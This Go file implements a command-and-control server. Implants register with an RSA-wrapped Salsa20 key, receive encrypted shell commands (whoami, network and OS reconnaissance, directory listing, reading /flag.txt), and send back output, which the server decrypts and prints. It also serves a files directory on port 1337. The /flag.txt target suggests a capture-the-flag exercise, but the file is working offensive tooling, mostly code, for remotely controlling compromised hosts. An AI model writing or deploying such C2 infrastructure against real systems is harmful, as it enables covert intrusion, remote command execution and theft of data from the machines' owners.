package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	b64 "encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"

	"github.com/google/uuid"
	"golang.org/x/crypto/salsa20"
)

type RegistrationResponse struct {
	ClientId string
}

type C2Request struct {
	ClientId string
	Nonce    string
	Msg      string
}

type C2Response struct {
	Nonce string
	Msg   string
}

type C2Get struct {
	MsgType string
}

type C2Command struct {
	MsgType string
	Command string
}

type C2Output struct {
	MsgType string
	Output  string
}

type Client struct {
	SalsaKey     []byte
	CommandQueue []string
}

var client_queue map[string]*Client
var rsa_key *rsa.PrivateKey

func register(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	// Load response
	reqBody, err := io.ReadAll(r.Body)
	if err != nil {
		log.Fatalln(err)
	}

	// Decode from base64
	salsa_enc, err := b64.StdEncoding.DecodeString(string(reqBody))

	//RSA Decrypt
	salsa_key := DecryptWithPrivateKey(salsa_enc, rsa_key)
	client_id := (uuid.New()).String()

	client_queue[client_id] = &Client{salsa_key, []string{"whoami", "ip addr show", "cat /etc/os-release", "ls -al /", "cat /flag.txt"}}

	reg := RegistrationResponse{client_id}
	resp, err := json.Marshal(reg)
	w.Header().Set("Content-Type", "application/json")
	io.WriteString(w, string(resp))
}

func cmd(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	// Load response
	reqBody, err := io.ReadAll(r.Body)
	if err != nil {
		log.Fatalln(err)
	}

	var c2_request C2Request
	var c2_response C2Response
	var c2_command C2Command

	err = json.Unmarshal(reqBody, &c2_request)

	cmd_queue := client_queue[c2_request.ClientId].CommandQueue

	if len(cmd_queue) == 0 {
		c2_command = C2Command{"exit", ""}
	} else {
		command, cmd_queue := cmd_queue[0], cmd_queue[1:]
		c2_command = C2Command{"cmd", command}
		client_queue[c2_request.ClientId].CommandQueue = cmd_queue
	}

	in, err := json.Marshal(c2_command)
	out := make([]byte, len(in))
	nonce := make([]byte, 8)

	_, err = rand.Read(nonce)
	if err != nil {
		log.Fatalf("Error while generating random nonce: %s", err)
	}

	salsa_key := [32]byte(client_queue[c2_request.ClientId].SalsaKey)

	// Encrypt message
	salsa20.XORKeyStream(out, in, nonce[:], &salsa_key)

	// Encode to base64
	enc := b64.StdEncoding.EncodeToString(out)
	enc_nonce := b64.StdEncoding.EncodeToString(nonce)

	// Send response
	c2_response = C2Response{enc_nonce, enc}
	c2_response_json, err := json.Marshal(c2_response)
	w.Header().Set("Content-Type", "application/json")
	io.WriteString(w, string(c2_response_json))
}

func output(w http.ResponseWriter, r *http.Request) {

	defer r.Body.Close()

	// Load response
	reqBody, err := io.ReadAll(r.Body)
	if err != nil {
		log.Fatalln(err)
	}

	var c2_request C2Request
	var c2_output C2Output

	err = json.Unmarshal(reqBody, &c2_request)

	// Get Salsa key for this client
	salsa_key := [32]byte(client_queue[c2_request.ClientId].SalsaKey)

	// Decode message from base64
	msg, err := b64.StdEncoding.DecodeString(c2_request.Msg)
	nonce, err := b64.StdEncoding.DecodeString(c2_request.Nonce)
	out := make([]byte, len(msg))

	// Decrypt message
	salsa20.XORKeyStream(out, msg, nonce, &salsa_key)

	err = json.Unmarshal(out, &c2_output)

	fmt.Printf("\n\nReceived Output from Client %s\n------------------------\n\n%s\n\n", c2_request.ClientId, c2_output.Output)

	io.WriteString(w, "")
}

func main() {

	client_queue = make(map[string]*Client)

	keyBytes, _ := os.ReadFile("privkey.pem")
	privPem, _ := pem.Decode(keyBytes)
	rsa_key, _ = x509.ParsePKCS1PrivateKey(privPem.Bytes)

	http.Handle("/", http.StripPrefix("/", http.FileServer(http.Dir("files"))))
	http.HandleFunc("/register", register)
	http.HandleFunc("/cmd", cmd)
	http.HandleFunc("/output", output)
	_ = http.ListenAndServe(":1337", nil)
}

func DecryptWithPrivateKey(ciphertext []byte, priv *rsa.PrivateKey) []byte {
	ct := big.NewInt(0)
	ct.SetBytes(ciphertext)
	plaintext := ct.Exp(ct, priv.D, priv.N)
	return plaintext.Bytes()
}
